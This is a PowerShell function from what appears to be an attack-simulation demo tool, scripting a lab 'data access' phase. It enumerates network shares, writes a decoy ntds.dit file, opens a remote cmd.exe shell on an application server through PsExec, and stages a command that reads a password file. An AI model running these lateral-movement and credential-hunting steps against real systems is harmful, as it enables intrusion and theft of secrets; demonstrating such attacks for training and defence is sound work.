function Start-Phase10DataAccess {

    ################################################################################
    #####                                                                      ##### 
    #####    Accessing Data                                                    #####                                 
    #####                                                                      #####
    ################################################################################

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host #####################

    $server = $($Script:ASOfflineDITFile).Split(".")[0]
    $fakeditfile = Join-Path -Path $Script:ASOfflineDITFile -ChildPath "ntds.dit"


    Invoke-Output -Type Header -Message "Starting with Share Enumeration"

    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "net ", "view ", "$server" `
        -Color $fgcC, $fgcF, $fgcV
    Write-Host ""

    try {
        Get-ChildItem -path $ASModulePath -Recurse | out-file $fakeditfile 
    }
    catch {
        <#Do this if a terminating exception happens#>
    }


    Invoke-Command -ScriptBlock { net view $server } | Out-Host

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Invoke-Output -Type Header -Message "Starting Enumeration of Share Content"
    Get-DirContent -Path $Script:ASOfflineDITFile

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }

    Invoke-Output -Type Header -Message  "Try to open cmd console on $Script:ASAppServer"

    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Start-Process ", ".\PsExec.exe ", "-ArgumentList ", """\\$Script:ASAppServer -accepteula cmd.exe""" `
        -Color $fgcC, $fgcF, $fgcS, $fgcV
    Write-Host ""

    try {
        Write-Output "more C:\temp\as2go\my-passwords.txt" | Set-Clipboard
    }
    catch {
        Write-Output "more C:\temp\as2go\my-passwords.txt" | clip
    }

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    
    $tool = Join-Path -Path $Script:ASTools -ChildPath "PsExec.exe"
    Start-Process $tool -ArgumentList "\\$Script:ASAppServer -accepteula cmd.exe"

    Invoke-Output -Type Bullet -Message "Try to find some sensitive data, e.g. files with passwords" 
    
    Write-Host""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "more ", "C:\temp\as2go\my-passwords.txt" `
        -Color $fgcC, $fgcV
    Write-Host ""

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }

    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}
